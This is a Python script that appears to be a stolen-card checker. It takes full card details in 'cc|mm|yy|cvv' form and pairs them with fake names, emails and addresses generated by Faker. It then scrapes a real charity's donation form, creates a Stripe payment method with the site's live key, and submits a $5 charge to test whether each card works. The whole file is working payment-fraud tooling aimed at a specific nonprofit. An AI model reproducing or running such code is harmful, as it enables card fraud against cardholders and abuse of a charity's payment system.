import asyncio
import random
import time
import json
import base64,bs4
import random
import urllib3
import uuid
from faker import Faker
from fake_useragent import UserAgent
import requests
from FUNC.defs import *
import re
from bs4 import BeautifulSoup




session = requests.session()
        
def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
                return None


def generate_fake_email():
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
    name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randint(5,10)))
    numbers = ''.join(random.choice('1234567890') for i in range(random.randint(4,5)))
    domain = random.choice(domains)
    return name + numbers + '@' + domain

def time_page():
    numbers = ''.join(random.choice('1234567890') for i in range(6))
    return numbers

fake = Faker()
name = fake.first_name()
email = generate_fake_email()
country = fake.country()
address1 = fake.street_address()
address2 = fake.secondary_address()
city = fake.city()
statee = fake.state()
state = fake.state_abbr()
zip = fake.zipcode_in_state(state)
phone = "+202" + fake.numerify("#########")
agent = fake.user_agent()

ptime = time_page()
guid = str(uuid.uuid4())
muid = str(uuid.uuid4())
sid = str(uuid.uuid4())
session = requests.Session()


async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")


        session =requests.Session()
        email="craish"+str(random.randint(548,98698))+"niki@gmail.com"

        headers = {
    'authority': 'pipelineforchangefoundation.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': agent,
}
        
        req1 = session.get("https://pipelineforchangefoundation.com/donate/", headers=headers,  verify=False, timeout=30)
        nonce = re.findall(r'name="_charitable_donation_nonce" value="(.*?)"', req1.text)[0]
        form_id = re.findall(r'name="charitable_form_id" value="(.*?)"', req1.text)[0]
                
        session.cookies.update(req1.cookies)
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': agent,
        }

        data = {
        'type':'card',
        'billing_details[name]':f'{name}',
        'billing_details[email]':f'{email}',
        'billing_details[address][city]':f'{city}',
        'billing_details[address][country]':'US',
        'billing_details[address][line1]':f'{address1}',      
        'billing_details[address][postal_code]':f'{zip}',     
        'billing_details[address][state]':'Texas',
        'billing_details[phone]':'+202814880301',
        'card[number]':f'{cc}',
        'card[cvc]':f'{cvv}',
        'card[exp_month]':f'{mes}',
        'card[exp_year]':f'{ano}',
        'guid':f'{guid}',
        'muid':f'{muid}',
        'sid':f'{sid}',
        'referrer':'https://pipelineforchangefoundation.com',
        'time_on_page': ptime,
        'key':'pk_live_51IK8KECy7gKATUV9t1d0t32P2r0P54BYaeaROb0vL6VdMJzkTpvZc6sIx1W7bKXwEWiH7iQT3gZENUMkYrdvlTte00PxlESxxt'
}
        
        req2 = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data,  verify=False, timeout=30)
        try:
            id=req2.json()['id']
        except:
                pass
        print(id)
        headers = {
    'authority': 'pipelineforchangefoundation.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://pipelineforchangefoundation.com',
    'referer': 'https://pipelineforchangefoundation.com/donate/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': agent,
    'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'charitable_form_id': form_id,
            f'{form_id}': '',
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': '/donate/',
            'campaign_id': '690',
            'description': 'Donate to Pipeline for Change Foundation',
            'ID': '0',
            'recurring_donation': 'once',
            'custom_recurring_donation_amount': '',
            'recurring_donation_period': 'once',
            'donation_amount': 'custom',
            'custom_donation_amount': '5.00',
            'first_name': name,
            'last_name': name,
            'email': email,
            'address': address1,
            'address_2': '',
            'city': city,
            'state': state,
            'postcode': zip,
            'country': 'US',
            'phone': phone,
            'gateway': 'stripe',
            'stripe_payment_method': id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }

        req3 = session.post("https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php", headers=headers, data=data,  verify=False, timeout=30)
        print(req3.text)
        await asyncio.sleep(2)
        return req3

    except Exception as e:
        return str(e)
    



